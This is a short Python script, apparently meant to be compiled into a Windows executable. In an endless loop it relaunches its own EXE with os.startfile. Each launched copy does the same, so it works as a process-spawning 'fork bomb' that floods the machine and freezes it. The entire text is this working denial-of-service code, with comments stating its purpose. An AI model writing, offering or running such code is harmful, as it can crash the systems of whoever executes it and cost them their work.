import sys
import os

# Get the path of the running EXE
exe_path = sys.executable

# Infinite loop to keep opening new instances of the EXE
while True:
    os.startfile(exe_path)
